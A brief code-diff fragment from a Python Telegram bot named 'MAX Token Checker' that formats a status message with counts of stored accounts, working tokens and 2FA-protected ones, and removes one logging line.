+    await message.answer(f"🤖 <b>MAX TOKEN CHECKER</b>\n\n📊 В базе: <b>{len(accounts)}</b>\n✅ Рабочих: {valid}\n🔐 2FA: {twofa}", parse_mode="HTML", reply_markup=main_keyboard())
 
 async def main():
     logger.info("MAX Token Checker запущен!")
-    logger.info(f"Загружено токенов: {len(accounts)}")
-    
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
